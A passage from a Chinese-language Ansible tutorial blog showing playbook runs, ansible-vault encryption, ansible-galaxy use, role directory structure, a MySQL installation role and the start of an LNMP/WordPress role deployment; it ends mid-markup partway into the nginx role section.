<span class="hljs-built_in">cd</span> websrvs<br>root@websrvs (2)[f:5]$ list<br>10.0.0.18<br>10.0.0.7<br>root@websrvs (2)[f:5]$ forks 10<br>root@websrvs (2)[f:10]$ <span class="hljs-built_in">cd</span> appsrvs<br>root@appsrvs (2)[f:10]$ list<br>10.0.0.102<br>10.0.0.18<br></code></pre></td></tr></table></figure><h3 id="1-4-ansible-playbook"><a href="#1-4-ansible-playbook" class="headerlink" title="1.4 ansible-playbook"></a>1.4 ansible-playbook</h3><p>此工具用于执行编写好的 playbook 任务<br>范例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[15:27:57 root@ansible-rocky ~]$ vi hello.yml<br>---<br><span class="hljs-comment">#hello world yml file</span><br>- hosts: websrvs<br>  remote_user: root<br>  gather_facts: no<br><br>  tasks:<br>    - name: hello world<br>      <span class="hljs-built_in">command</span>: /usr/bin/wall hello world<br>[15:30:12 root@ansible-rocky ~]$ ansible-playbook hello.yml <br><br>PLAY [websrvs] ****************************************************************************************<br><br>TASK [hello world] ************************************************************************************<br>changed: [10.0.0.18]<br>changed: [10.0.0.7]<br><br>PLAY RECAP ********************************************************************************************<br>10.0.0.18                  : ok=1    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   <br>10.0.0.7                   : ok=1    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0<br></code></pre></td></tr></table></figure><p><a href="https://img2023.cnblogs.com/blog/3077161/202301/3077161-20230110094302604-1848189472.png"><img src="3077161-20230110094302604-1848189472.png" alt="img"></a></p><p><a href="https://img2023.cnblogs.com/blog/3077161/202301/3077161-20230110094302648-1358849118.png"><img src="3077161-20230110094302648-1358849118.png" alt="img"></a></p><h3 id="1-5-ansible-vault"><a href="#1-5-ansible-vault" class="headerlink" title="1.5 ansible-vault"></a>1.5 ansible-vault</h3><p>此工具可以用于加密解密yml文件</p><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible-vault [create|decrypt|edit|encrypt|rekey|view]<br></code></pre></td></tr></table></figure><p>范例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#1 加密</span><br>[15:31:01 root@ansible-rocky ~]$ ansible-vault encrypt hello.yml <br>New Vault password: <br>Confirm New Vault password: <br>Encryption successful<br><span class="hljs-comment">##查看文件内容</span><br>[15:38:15 root@ansible-rocky ~]$ <span class="hljs-built_in">cat</span> hello.yml <br><span class="hljs-variable">$ANSIBLE_VAULT</span>;1.1;AES256<br>65323766623831636563636132623333623932633461396563383764333037396563633766363231<br>3335646336346136626231353133623566626166626336380a306630643338353031353739353538<br>62373930306636633430653537363534376231323839643131376335653366656634616365663063<br>6236663364343461610a383365643534646564316261326166316233393039386134363436313138<br>63323939663537666462646233613262646637306130626336336239323737623833393735666364<br>36336334316666326265356166326163373039616533353564353964396266376637363037353338<br>37623639656262303966363766356630376466666463363338353535623635633137616335383333<br>65333263643762353264326563326362393663316538666530616664643438666435373162616164<br>30313761323030343165666330326537653430333764363834326566333666316133386465663334<br>63353035616266396366366662643839353431653736353465626261623433343735663534663831<br>32636632653730323465366531353531633761623930303138643337613162613062333237633566<br>39663562393535343165<br><br><span class="hljs-comment">#2 解密</span><br>[15:38:18 root@ansible-rocky ~]$ ansible-vault decrypt hello.yml <br>Vault password: <br>Decryption successful<br>[15:39:50 root@ansible-rocky ~]$ <span class="hljs-built_in">cat</span> hello.yml <br>---<br><span class="hljs-comment">#hello world yml file</span><br>- hosts: websrvs<br>  remote_user: root<br>  gather_facts: no<br><br>  tasks:<br>    - name: hello world<br>      <span class="hljs-built_in">command</span>: /usr/bin/wall hello world<br>      <br><span class="hljs-comment">#3 查看加密后的yml文件内容</span><br>[15:41:44 root@ansible-rocky ~]$ ansible-vault view hello.yml <br>Vault password: <br>---<br><span class="hljs-comment">#hello world yml file</span><br>- hosts: websrvs<br>  remote_user: root<br>  gather_facts: no<br><br>  tasks:<br>    - name: hello world<br>      <span class="hljs-built_in">command</span>: /usr/bin/wall hello world<br><br><span class="hljs-comment">#4 编辑加密文件</span><br>[15:41:50 root@ansible-rocky ~]$ ansible-vault edit hello.yml <br>Vault password:             <span class="hljs-comment">#输入密码后进入vim编辑器进行编辑</span><br><br><span class="hljs-comment">#5 修改口令</span><br>[15:44:53 root@ansible-rocky ~]$ ansible-vault rekey hello.yml <br>Vault password:    <span class="hljs-comment">#先前的口令</span><br>New Vault password:  <span class="hljs-comment">#修改为的口令</span><br>Confirm New Vault password:  <span class="hljs-comment">#再确认一遍</span><br>Rekey successful<br><br><span class="hljs-comment">#6 创建加密新文件</span><br>[15:46:31 root@ansible-rocky ~]$ ansible-vault create new.yml<br>New Vault password: <br>Confirm New Vault password:<br><br><span class="hljs-comment">#7 交互式输入密码来执行加密文件</span><br>[15:46:46 root@ansible-rocky ~]$ ansible-playbook --ask-vault-pass hello.yml <br>Vault password: <br><br>PLAY [websrvs] ****************************************************************************************<br><br>TASK [hello world] ************************************************************************************<br>changed: [10.0.0.18]<br>changed: [10.0.0.7]<br><br>PLAY RECAP ********************************************************************************************<br>10.0.0.18                  : ok=1    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   <br>10.0.0.7                   : ok=1    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0 <br><br><span class="hljs-comment">#8 从文件中读取密码</span><br>[15:52:56 root@ansible-rocky ~]$ ansible-playbook --vault-password-file pass.txt hello.yml <br><br>PLAY [websrvs] ****************************************************************************************<br><br>TASK [hello world] ************************************************************************************<br>changed: [10.0.0.18]<br>changed: [10.0.0.7]<br><br>PLAY RECAP ********************************************************************************************<br>10.0.0.18                  : ok=1    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   <br>10.0.0.7                   : ok=1    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0<br><br><span class="hljs-comment">#9 从配置文件中添加密码文件</span><br>[15:53:33 root@ansible-rocky ~]$ vi /etc/ansible/ansible.cfg<br><span class="hljs-comment">#添加以下一行信息</span><br>ault-password-file=pass.txt<br>[15:58:58 root@ansible-rocky ~]$ ansible-playbook hello.yml <br><br>PLAY [websrvs] ****************************************************************************************<br><br>TASK [hello world] ************************************************************************************<br>changed: [10.0.0.18]<br>changed: [10.0.0.7]<br><br>PLAY RECAP ********************************************************************************************<br>10.0.0.18                  : ok=1    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   <br>10.0.0.7                   : ok=1    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0<br></code></pre></td></tr></table></figure><h3 id="1-6-ansible-galaxy"><a href="#1-6-ansible-galaxy" class="headerlink" title="1.6 ansible-galaxy"></a>1.6 ansible-galaxy</h3><p>Galaxy 是一个免费网站, 类似于github网站, 网站上发布了很多的共享的roles角色。</p><p>Ansible 提供了ansible-galaxy命令行工具连接 <a href="https://galaxy.ansible.com/">https://galaxy.ansible.com</a> 网站下载相应的roles, 进行init(初始化、search( 查拘、install(安装、 remove(移除)等操作。</p><p>范例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#搜索项目</span><br>[16:05:04 root@ansible-rocky ~]$ ansible-galaxy search lamp<br><br>Found 100 roles matching your search:<br><br> Name                                      Description<br> ----                                      -----------<br> abhiarun_94.apache_lamp                   your role description<br> adelaidearnauld.galaxy-lamp               your description<br> adelaidearnauld.lamp_compose              your description<br> ajish_antony.ansible_lamp                 your role description<br> AlexanderAllen.Liara                      The sexiest toolkit <span class="hljs-keyword">for</span> LAMP hackers.<br> alphinaugustine.ansible_role              your description<br> amtega.horde                              Setup horde<br> ......<br> <br><br><span class="hljs-comment">#2 列出所有已安装的galaxy</span><br>[16:06:32 root@ansible-rocky ~]$ ansible-galaxy list<br><span class="hljs-comment"># /usr/share/ansible/roles</span><br><span class="hljs-comment"># /etc/ansible/roles</span><br><br><br><span class="hljs-comment">#3 安装galaxy，默认下载到~/.ansible/roles</span><br>[16:14:06 root@ansible-rocky ~]$ ansible-galaxy install 想要安装的galaxy<br><br><span class="hljs-comment">#删除</span><br>ansible-galaxy remove <br></code></pre></td></tr></table></figure><h2 id="2-总结ansible-role目录结构及文件用途。"><a href="#2-总结ansible-role目录结构及文件用途。" class="headerlink" title="2 总结ansible role目录结构及文件用途。"></a>2 总结ansible role目录结构及文件用途。</h2><p><strong>roles目录结构：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">├── playbook1.yml<br>├── playbook2.yml<br>├── roles/<br>│   ├── project1/<br>│   │├── tasks/<br>│   │├── files/<br>│   │├── vars/<br>│   │├── templates/<br>│   │├── handlers/<br>│   │├── default/<br>│   │└── meta/<br>│   ├── project2/<br>│   │├── tasks/<br>│   │├── files/<br>│   │├── vars/<br>│   │├── templates/<br>│   │├── handlers/<br>│   │├── default/<br>│   │└── meta/<br></code></pre></td></tr></table></figure><p><strong>Roles各目录作用</strong></p><p><code>roles/project/ </code>:项目名称,有以下子目录</p><ul><li><code>files/</code> ：存放由<code>copy</code>或<code>script</code>模块等调用的文件</li><li><code>templates/</code>：<code>template</code>模块查找所需要模板文件的目录</li><li><code>tasks/</code>：定义<code>task</code>,<code>role</code>的基本元素，至少应该包含一个名为<code>main.yml</code>的文件；其它的文件需要在此文件中通过<code>include</code>进行包含</li><li><code>handlers/</code>：至少应该包含一个名为<code>main.yml</code>的文件；此目录下的其它的文件需要在此文件中通过<code>include</code>进行包含</li><li><code>vars/</code>：<strong>定义变量</strong>，至少应该包含一个名为<code>main.yml</code>的文件；此目录下的其它的变量文件需要在此文件中通过include进行包含,也可以通过项目目录中的<code>group_vars/all</code>定义变量,从而实现角色通用代码和项目数据的分离</li><li><code>meta/</code>：<strong>定义当前角色的特殊设定及其依赖关系</strong>,至少应该包含一个名为<code>main.yml</code>的文件，其它文件需在此文件中通过include进行包含</li><li><code>default/</code>：设定默认变量时使用此目录中的main.yml文件，比<code>vars</code>的<strong>优先级低</strong></li></ul><h2 id="3-使用ansible-playbook实现一个mysql角色。"><a href="#3-使用ansible-playbook实现一个mysql角色。" class="headerlink" title="3 使用ansible playbook实现一个mysql角色。"></a>3 使用ansible playbook实现一个mysql角色。</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#mysql角色目录</span><br>[18:16:16 root@ansible-rocky opt]$ tree<br>.<br>├── ansible.cfg<br>├── hosts<br>├── mysql_role.yml<br>└── roles<br>    └── mysql<br>        ├── files<br>        │   └── mysql-8.0.31-linux-glibc2.12-x86_64.tar.xz<br>        ├── tasks<br>        │   └── main.yml<br>        └── templates<br>            └── my.cnf.j2<br>            <br><span class="hljs-comment">#定义主机及变量</span><br>[18:22:50 root@ansible-rocky opt]$ <span class="hljs-built_in">tail</span> -n9 hosts <br>[dbsrvs:vars]<br>db_group=mysql<br>db_gid=306<br>db_user=mysql<br>db_uid=306<br>db_version=8.0.31<br>db_file=<span class="hljs-string">&quot;mysql-&#123;&#123;db_version&#125;&#125;-linux-glibc2.12-x86_64.tar.xz&quot;</span><br>db_data_dir=<span class="hljs-string">&quot;/data/mysql&quot;</span><br>db_root_passwd=<span class="hljs-string">&quot;lgq123456**&quot;</span><br><br><span class="hljs-comment">#下载准备mysql源文件包</span><br>[18:22:54 root@ansible-rocky opt]$ <span class="hljs-built_in">ls</span> roles/mysql/files/<br>mysql-8.0.31-linux-glibc2.12-x86_64.tar.xz<br><br><span class="hljs-comment">#创建task文件</span><br>[18:24:40 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> roles/mysql/tasks/main.yml <br>- name: install dependent package<br>  yum:<br>    name: <span class="hljs-string">&quot;&#123;&#123; item &#125;&#125;&quot;</span><br>  loop:<br>    - libaio<br>    - numactl-libs<br><br>- name: create mysql group<br>  group: name=&#123;&#123;db_group&#125;&#125; gid=&#123;&#123;db_gid&#125;&#125;<br><br>- name: create mysql user<br>  user: name=&#123;&#123;db_user&#125;&#125; uid=&#123;&#123;db_uid&#125;&#125; system=<span class="hljs-built_in">yes</span> shell=<span class="hljs-string">&quot;/sbin/nologin&quot;</span> create_home=no group=&#123;&#123;db_group&#125;&#125;<br><br>- name: copy tar to remote host and file mode<br>  unarchive:<br>    src: <span class="hljs-string">&quot;&#123;&#123; db_file &#125;&#125;&quot;</span><br>    dest: <span class="hljs-string">&quot;/usr/local/&quot;</span><br>    owner: root<br>    group: root<br><br>- name: create lingfile /usr/local/mysql<br>  file:<br>    src: <span class="hljs-string">&quot;/usr/local/mysql-&#123;&#123; db_version &#125;&#125;-linux-glibc2.12-x86_64&quot;</span><br>    dest: <span class="hljs-string">&quot;/usr/local/mysql&quot;</span><br>    state: <span class="hljs-built_in">link</span><br><br>- name: path file<br>  copy:<br>    content: <span class="hljs-string">&quot;PATH=/usr/local/mysql/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br>    dest: <span class="hljs-string">&quot;/etc/profile.d/mysql.sh&quot;</span><br><br>- name: config file<br>  template:<br>    src: my.cnf.j2<br>    dest: <span class="hljs-string">&quot;/etc/my.cnf&quot;</span><br><br>- name: create directory<br>  file:<br>    name: <span class="hljs-string">&quot;/data&quot;</span><br>    state: directory<br><br>- name: init mysql data<br>  shell:<br>    cmd: <span class="hljs-string">&quot;/usr/local/mysql/bin/mysqld --initialize-insecure --user=&#123;&#123; db_user &#125;&#125; --datadir=&#123;&#123; db_data_dir &#125;&#125;&quot;</span><br>  tags:<br>    - init<br><br>- name: service script<br>  copy:<br>    src: <span class="hljs-string">&quot;/usr/local/mysql/support-files/mysql.server&quot;</span><br>    dest: <span class="hljs-string">&quot;/etc/init.d/mysqld&quot;</span><br>    remote_src: <span class="hljs-built_in">yes</span><br>    mode: <span class="hljs-string">&#x27;+x&#x27;</span><br><br>- name: start service<br>  shell:<br>    cmd: chkconfig --add mysqld;chkconfig mysqld on;service mysqld start<br><br>- name: change root password<br>  shell:<br>    cmd: <span class="hljs-string">&quot;/usr/local/mysql/bin/mysqladmin -uroot password &#123;&#123; db_root_passwd &#125;&#125;&quot;</span><br>    <br>    <br><span class="hljs-comment">#准备MySQL 配置文件模板</span><br>[18:25:25 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> roles/mysql/templates/my.cnf.j2 <br>[mysqld]<br>server-id=1<br>log-bin<br>datadir=&#123;&#123; db_data_dir &#125;&#125;<br>socket=&#123;&#123; db_data_dir &#125;&#125;/mysql.sock<br>log-error=&#123;&#123; db_data_dir &#125;&#125;/mysql.log<br>pid-file=&#123;&#123; db_data_dir &#125;&#125;/mysql.pid<br><br>[client]<br>socket=&#123;&#123; db_data_dir &#125;&#125;/mysql.sock<br><br><span class="hljs-comment">#准备MySQL角色playbook文件</span><br>[18:25:38 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> mysql_role.yml <br>- hosts: dbsrvs<br>  remote_user: root<br>  gather_facts: no<br><br>  roles:<br>    - mysql<br>    <br><span class="hljs-comment">#部署MySQL</span><br>[18:26:34 root@ansible-rocky opt]$ ansible-playbook -i hosts mysql_role.yml<br>PLAY [dbsrvs] *****************************************************************************************<br><br>TASK [mysql : install dependent package] **************************************************************<br>ok: [10.0.0.38] =&gt; (item=libaio)<br>ok: [10.0.0.38] =&gt; (item=numactl-libs)<br><br>TASK [mysql : create mysql group] *********************************************************************<br>changed: [10.0.0.38]<br><br>TASK [mysql : create mysql user] **********************************************************************<br>changed: [10.0.0.38]<br><br>TASK [mysql : copy tar to remote host and file mode] **************************************************<br>changed: [10.0.0.38]<br><br>TASK [mysql : create lingfile /usr/local/mysql] *******************************************************<br>changed: [10.0.0.38]<br><br>TASK [mysql : path file] ******************************************************************************<br>changed: [10.0.0.38]<br><br>TASK [mysql : config file] ****************************************************************************<br>changed: [10.0.0.38]<br><br>TASK [mysql : create directory] ***********************************************************************<br>ok: [10.0.0.38]<br><br>TASK [mysql : init mysql data] ************************************************************************<br>changed: [10.0.0.38]<br><br>TASK [mysql : service script] *************************************************************************<br>changed: [10.0.0.38]<br><br>TASK [mysql : start service] **************************************************************************<br>changed: [10.0.0.38]<br><br>TASK [mysql : change root password] *******************************************************************<br>changed: [10.0.0.38]<br><br>PLAY RECAP ********************************************************************************************<br>10.0.0.38                  : ok=12   changed=10   unreachable=0    failed=0    skipped=0    rescued=0    ignored=0<br></code></pre></td></tr></table></figure><h2 id="4-基于角色完成部署LNMP架构，并支持一键发布，回滚应用。同时基于zabbix角色批量部署zabbix。"><a href="#4-基于角色完成部署LNMP架构，并支持一键发布，回滚应用。同时基于zabbix角色批量部署zabbix。" class="headerlink" title="4 基于角色完成部署LNMP架构，并支持一键发布，回滚应用。同时基于zabbix角色批量部署zabbix。"></a>4 基于角色完成部署LNMP架构，并支持一键发布，回滚应用。同时基于zabbix角色批量部署zabbix。</h2><h3 id="4-1-部署LNMP架构"><a href="#4-1-部署LNMP架构" class="headerlink" title="4.1 部署LNMP架构"></a>4.1 部署LNMP架构</h3><h4 id="4-1-1-目录结构"><a href="#4-1-1-目录结构" class="headerlink" title="4.1.1 目录结构"></a>4.1.1 目录结构</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">[18:57:47 root@ansible-rocky opt]$ tree /opt/<br>/opt/<br>├── ansible.cfg<br>├── hosts<br>├── lnmp_role.yml<br>├── mysql_role.yml<br>├── nginx_role.yml<br>├── php-fpm_role.yml<br>├── roles<br>│   ├── mysql<br>│   │   ├── files<br>│   │   │   └── mysql-8.0.31-linux-glibc2.12-x86_64.tar.xz<br>│   │   ├── tasks<br>│   │   │   └── main.yml<br>│   │   └── templates<br>│   │       └── my.cnf.j2<br>│   ├── nginx<br>│   │   ├── handlers<br>│   │   │   └── main.yml<br>│   │   ├── tasks<br>│   │   │   └── main.yml<br>│   │   └── templates<br>│   │       ├── nginx.conf.j2<br>│   │       └── nginx.service.j2<br>│   ├── php-fpm<br>│   │   ├── files<br>│   │   │   ├── test.php<br>│   │   │   └── www.conf<br>│   │   ├── handlers<br>│   │   │   └── main.yml<br>│   │   ├── tasks<br>│   │   │   └── main.yml<br>│   │   └── templates<br>│   │       ├── php-fpm.conf.j2<br>│   │       └── php.ini.j2<br>│   └── wordpress<br>│       ├── files<br>│       │   └── wordpress-6.1.1-zh_CN.zip<br>│       └── tasks<br>│           └── main.yml<br>└── wordpress_role.yml<br><br>17 directories, 22 files<br></code></pre></td></tr></table></figure><h4 id="4-1-2-LNMP架构所需主机清单以及变量设置"><a href="#4-1-2-LNMP架构所需主机清单以及变量设置" class="headerlink" title="4.1.2 LNMP架构所需主机清单以及变量设置"></a>4.1.2 LNMP架构所需主机清单以及变量设置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">[18:58:15 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> hosts <br>[websrvs]<br>10.0.0.18<br>10.0.0.28<br><br>[websrvs:vars]<br>version=<span class="hljs-string">&quot;1.20.2&quot;</span><br>url=<span class="hljs-string">&quot;http://nginx.org/download/nginx-&#123;&#123; version &#125;&#125;.tar.gz&quot;</span><br>install_dir=<span class="hljs-string">&quot;/apps/nginx&quot;</span><br>fqdn=<span class="hljs-string">&quot;www.yanlinux.org&quot;</span><br>root_path=<span class="hljs-string">&quot;/data/wordpress&quot;</span><br>app=<span class="hljs-string">&quot;wordpress-6.1.1-zh_CN&quot;</span><br><br>[dbsrvs]<br>10.0.0.38<br><br>[dbsrvs:vars]<br>db_group=mysql<br>db_gid=306<br>db_user=mysql<br>db_uid=306<br>db_version=8.0.31<br>db_file=<span class="hljs-string">&quot;mysql-&#123;&#123;db_version&#125;&#125;-linux-glibc2.12-x86_64.tar.xz&quot;</span><br>db_data_dir=<span class="hljs-string">&quot;/data/mysql&quot;</span><br>db_root_passwd=<span class="hljs-string">&quot;lgq123456**&quot;</span><br></code></pre></td></tr></table></figure><h4 id="4-1-2-实现编译安装nginx角色"><a href="#4-1-2-实现编译安装nginx角色" class="headerlink" title="4.1.2 实现编译安装nginx角色"></a>4.1.2 实现编译安装nginx角色</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 